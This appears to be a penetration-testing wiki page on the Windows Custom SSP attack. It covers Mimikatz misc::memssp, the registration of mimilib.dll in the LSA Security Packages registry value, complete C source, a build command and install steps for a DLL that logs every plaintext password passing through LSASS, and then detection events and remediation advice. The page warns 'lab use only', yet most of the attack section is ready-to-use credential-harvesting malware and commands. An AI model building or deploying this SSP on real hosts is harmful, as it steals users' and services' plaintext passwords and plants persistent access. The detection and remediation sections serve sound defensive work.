# Custom SSP Attack

Full syntax and every flag explained: [Mimikatz](../../tools/mimikatz.md)

>  **Persistence + credential harvesting.** Unlike [Skeleton Key](skeleton-key.md) (a backdoor password) or [DSRM](dsrm.md) (a backdoor account), a Custom SSP passively logs every authentication that hits the box - usernames AND **plaintext passwords** - for as long as it's loaded.

> ⚠️ **Lab use only.** Loading an unsigned DLL into LSASS is one of the loudest IOCs in Windows. **LSA Protection (RunAsPPL)** blocks the on-disk variant entirely. Do not use on real engagements.

---

## What It Is

A **Security Support Provider (SSP)** is a DLL that LSASS loads to handle authentication protocols. Windows ships with several: `msv1_0` (NTLM), `kerberos`, `schannel` (TLS), `wdigest`, `tspkg`, `pku2u`, `cloudap`. They sit *inside* LSASS and process credentials every time someone authenticates.

A **Custom SSP** is your own DLL injected into that list. Because LSASS hands every credential attempt to its SSPs, your DLL gets to see:
- Every interactive logon (console, RDP)
- Every `runas`, every scheduled task starting
- Every service start (and its service-account password)
- Every `net use`, every Kerberos pre-auth - anything that touches LSASS

It writes them to disk in **plaintext**.

---

## Privileges Required

| Phase | Account / Privilege | Why |
|---|---|---|
| In-memory variant (`misc::memssp`) | **SYSTEM + SeDebugPrivilege on target** | Writes a hook into LSASS memory - same constraint as Skeleton Key |
| On-disk variant - drop DLL into `System32` | **Local Administrator on target** | `C:\Windows\System32\` is admin-only-writable |
| On-disk variant - register the SSP in the registry | **Local Administrator on target** | `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` is admin-only-writable |
| Trigger activation | Wait for **next reboot** | LSASS only enumerates `Security Packages` at startup - no privilege needed, just patience (or `shutdown /r` if you can) |
| Read the harvested log file | **Local Administrator** | The log lands in `System32\` (admin-only-readable) by default |
| Capture credentials (passive, runtime) | **None - your DLL runs as SYSTEM inside lsass.exe** | LSASS executes as SYSTEM, so once loaded your code sees every authentication for free |

**Why a DC is the high-value target:** Every domain authentication eventually touches a DC. Drop the SSP on a DC and you harvest credentials for the entire domain over time. On a workstation you only get what authenticates there locally.

**Blocker:** LSA Protection (RunAsPPL) blocks the on-disk variant outright - LSASS refuses to load any SSP not signed by Microsoft's LSA-specific code-signing cert. RunAsPPL is the single most effective control here.

---

## Two Variants

### 1. In-memory (Mimikatz `misc::memssp`)
- Patches LSASS in memory, no DLL on disk
- Logs to `C:\Windows\System32\mimilsa.log`
- **Lost on reboot** - same family as Skeleton Key
- Useful for short-term grab on a server you already own

```sh
mimikatz # privilege::debug
mimikatz # misc::memssp
# Now every logon writes to C:\Windows\System32\mimilsa.log
```

### 2. On-disk (`mimilib.dll`)
- DLL gets registered as a real SSP via registry
- LSASS loads it on every boot - **persistent**
- Logs to `C:\Windows\System32\kiwissp.log`

```sh
# 1) Drop the DLL (32 or 64-bit to match LSASS)
copy mimilib.dll C:\Windows\System32\

# 2) Add it to the SSP list (REG_MULTI_SZ - \0 separates entries)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" ^
  /t REG_MULTI_SZ ^
  /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f

# 3) Reboot the DC (or wait for next reboot - patient persistence)

# 4) Read harvested creds from:
type C:\Windows\System32\kiwissp.log
```

---

## Mimikatz IS a Custom SSP

This is the part that's easy to miss: **`mimilib.dll` ships with Mimikatz as a working, real Custom SSP.** It's not a separate concept - it's an example implementation.

Inside the Mimikatz source (`mimilib/kssp.c`), there's a function called `kssp_SpAcceptCredentials` that:
1. Gets called by LSASS every time credentials are submitted
2. Receives the username + plaintext password as `UNICODE_STRING` arguments
3. Opens `kiwissp.log` and appends `domain\user : password`
4. Returns `STATUS_SUCCESS` so LSASS continues normally

That's literally all it does. It's a passive logger. The "attack" is just the Windows SSP API used for evil - there is no exploit, no patch, no memory corruption. Windows is doing exactly what it was designed to do; the trick is that the attacker registered their own SSP after gaining admin.

`misc::memssp` is the same idea minus the on-disk DLL - Mimikatz allocates memory inside LSASS, copies a tiny hook there, patches the `SpAcceptCredentials` pointer of an existing SSP (like `msv1_0`) to point to its hook, and the hook writes to `mimilsa.log` before calling the real function.

---

## How You'd Actually Build Your Own

You don't need Mimikatz at all - if you have the Windows SDK and a C compiler, you can write your own SSP in ~50 lines. This is *educational* - useful for understanding the API and reading Mimikatz source, not for evading detection (any unsigned DLL in LSASS is a screaming red flag).

### The API contract

An SSP is a DLL that exports **one function**: `SpLsaModeInitialize`. LSASS calls it at load time and your function fills in a table of callbacks:

```c
NTSTATUS NTAPI SpLsaModeInitialize(
    ULONG LsaVersion,
    PULONG PackageVersion,
    PSECPKG_FUNCTION_TABLE *ppTables,
    PULONG pcTables);
```

The function table (`SECPKG_FUNCTION_TABLE`) has ~30 callback slots - `SpInitialize`, `SpShutdown`, `SpAcceptCredentials`, `SpLogonUser`, etc. You only need to implement the ones LSASS will actually call for your use case; the rest can be `NULL`.

The one we care about for credential harvesting:

```c
NTSTATUS NTAPI SpAcceptCredentials(
    SECURITY_LOGON_TYPE LogonType,
    PUNICODE_STRING AccountName,
    PSECPKG_PRIMARY_CRED PrimaryCredentials,
    PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials);
```

`PrimaryCredentials->Password` is a `UNICODE_STRING` containing the **plaintext password** that the user just submitted. LSASS hands it to every registered SSP so each can decide whether to "accept" the credential (cache it, derive keys from it, etc.). You just write it to disk and return success.

### Minimal skeleton (`myssp.c`)

```c
#define SECURITY_WIN32
#include <windows.h>
#include <ntsecapi.h>
#include <ntsecpkg.h>
#include <stdio.h>

// Logger - append username + plaintext to C:\Windows\Temp\ssp.log
static void LogCred(PUNICODE_STRING user, PUNICODE_STRING pass) {
    FILE *f = fopen("C:\\Windows\\Temp\\ssp.log", "ab");
    if (!f) return;
    fwprintf(f, L"%wZ : %wZ\r\n", user, pass);
    fclose(f);
}

// LSASS calls this every time credentials are submitted
NTSTATUS NTAPI MySpAcceptCredentials(
    SECURITY_LOGON_TYPE LogonType,
    PUNICODE_STRING AccountName,
    PSECPKG_PRIMARY_CRED PrimaryCredentials,
    PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
    if (PrimaryCredentials && PrimaryCredentials->Password.Length > 0)
        LogCred(AccountName, &PrimaryCredentials->Password);
    return STATUS_SUCCESS;
}

// Stubs for required callbacks (LSASS will crash if these are NULL and called)
NTSTATUS NTAPI MySpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Params,
    PLSA_SECPKG_FUNCTION_TABLE FunctionTable) { return STATUS_SUCCESS; }
NTSTATUS NTAPI MySpShutdown(void) { return STATUS_SUCCESS; }

// The function table LSASS reads
static SECPKG_FUNCTION_TABLE MyTable = {
    .InitializePackage   = NULL,
    .LogonUser           = NULL,
    .CallPackage         = NULL,
    .LogonTerminated     = NULL,
    .CallPackageUntrusted= NULL,
    .CallPackagePassthrough = NULL,
    .LogonUserEx         = NULL,
    .LogonUserEx2        = NULL,
    .Initialize          = MySpInitialize,
    .Shutdown            = MySpShutdown,
    .GetInfo             = NULL,
    .AcceptCredentials   = MySpAcceptCredentials,
    // ... remaining slots NULL
};

// THE export LSASS looks for
__declspec(dllexport)
NTSTATUS NTAPI SpLsaModeInitialize(
    ULONG LsaVersion,
    PULONG PackageVersion,
    PSECPKG_FUNCTION_TABLE *ppTables,
    PULONG pcTables)
{
    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables       = &MyTable;
    *pcTables       = 1;
    return STATUS_SUCCESS;
}

BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID l) { return TRUE; }
```

### `myssp.def` (export the symbol cleanly)
```
LIBRARY myssp
EXPORTS
    SpLsaModeInitialize
```

### Build (Visual Studio x64 dev prompt)
```sh
cl /LD /MT myssp.c /link /DEF:myssp.def secur32.lib advapi32.lib
# Output: myssp.dll
```

### Install
```sh
copy myssp.dll C:\Windows\System32\
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" ^
  /t REG_MULTI_SZ ^
  /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0myssp" /f
# Reboot - on next login, plaintext appears in C:\Windows\Temp\ssp.log
```

That's it. Five real functions, one export, one registry entry, one reboot.

### Why this is mostly an educational exercise
- The DLL is **unsigned** - gets flagged immediately by any EDR worth its license.
- **LSA Protection (RunAsPPL)** refuses to load it: LSASS becomes a Protected Process Light and only loads SSPs signed with a Microsoft Lsa code-signing cert (which you can't get).
- The `Security Packages` registry value is heavily monitored - adding to it is a high-confidence detection.
- Mimikatz's `mimilib.dll` is already signatured by every AV.

The value is *understanding why Mimikatz works* and being able to read its source. The defensive playbook (LSA Protection, Credential Guard, monitoring `HKLM\System\CurrentControlSet\Control\Lsa`) makes complete sense once you understand that LSASS is essentially loading user-supplied plugins.

---

## Custom SSP vs Other Persistence

| | Custom SSP | Skeleton Key | DSRM | Golden Ticket |
|---|---|---|---|---|
| **Goal** | **Harvest** plaintexts | Master password backdoor | Persistent local admin on DC | Domain-wide ticket forge |
| **Needs** | SYSTEM + reg edit + reboot | DA on DC | DA on DC + reg edit | krbtgt hash + SID |
| **Survives reboot** | ✅ Yes (on-disk variant) | ❌ No | ✅ Yes | ✅ Yes |
| **Blocked by RunAsPPL** | ✅ Fully | ✅ Fully | ❌ No (different attack surface) | ❌ No |
| **Breaks anything** | ❌ No | ✅ PKINIT/certs | ❌ No | ❌ No |
| **Detection** | Unsigned DLL in LSASS, registry write, new file in System32 | Cert auth failures | Reg change + Event 4624 type 3 | Hard - PAC anomalies |
| **Use when** | Need plaintexts of accounts that haven't logged in yet | Lab only - fast persistence | Long-term DC backdoor | Forge any ticket anytime |

**Rule of thumb:** Custom SSP is the **passive credential harvester**. Drop it, wait for accounts to authenticate, collect plaintexts. Combine with DSRM (so you still have access after creds rotate) and Golden Ticket (so you can forge anywhere) for layered persistence - *in a lab*.

---

## Detection Notes

- **Event ID 4657** for `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` registry value changes.
- **Sysmon Event 7** (image loaded) - any DLL load into `lsass.exe` that isn't signed by Microsoft.
- **Suspicious file**: `kiwissp.log`, `mimilsa.log`, or any unusual `.log` in `System32` created by lsass.exe.
- File integrity monitoring on `C:\Windows\System32\*.dll` - new DLLs added here are inherently suspicious.

---

## Remediation (For Report Writing)

**Root cause:** An attacker with SYSTEM/DA on the host registered a malicious SSP in the LSA configuration. LSASS loads the attacker DLL into its address space on every boot, where it sees the plaintext credentials of every user, service, and scheduled task that authenticates to the system.

| Finding | Remediation |
|---|---|
| Unauthorized DLL listed under `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` | Remove the entry, delete the DLL, **reboot**. Note: the attacker may have harvested plaintexts in the meantime - assume all accounts that authenticated since installation are compromised. |
| Harvested credential log file (`kiwissp.log`, `mimilsa.log`, custom name) | Treat as a credential breach. Rotate every password that appears in the file. |
| LSA Protection (RunAsPPL) not enabled | Enable `RunAsPPL = 1` in `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` and reboot. LSASS will then refuse to load unsigned SSPs. Test compatibility with security/AV products first - some legitimate vendors inject into LSASS and require an exception list (`RunAsPPLBoot`). |
| Credential Guard not enabled | Deploy Credential Guard (VBS-isolated credentials) - even if LSASS is compromised, NTLM hashes and Kerberos TGTs are unreachable to the attacker. |
| No monitoring for SSP registry changes | Add an alert for any write to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. This value should change essentially never outside of OS upgrades. |
| Unsigned DLLs allowed to load into LSASS | Apply WDAC / AppLocker policies that restrict LSASS to Microsoft-signed binaries. |

**Key point for reports:** A Custom SSP is a passive harvester - by the time it's discovered, plaintext credentials have likely been collected for every account that authenticated. Incident response must assume those credentials are burned. The defensive control is LSA Protection (RunAsPPL); it's free, ships in modern Windows, and would have blocked this entirely.

---

## See Also
- [Mimikatz](../../tools/mimikatz.md) - `misc::memssp` and the `mimilib.dll` SSP
- [Skeleton Key](skeleton-key.md) - memory-only LSASS patch for master password
- [DSRM](dsrm.md) - persistent local admin on DC (complements credential harvesting)
- [Golden Ticket](golden-ticket.md) - domain-wide forge once you have krbtgt
- [Dumping NTDS.dit](dumping-ntds.md) - bulk credential theft alternative
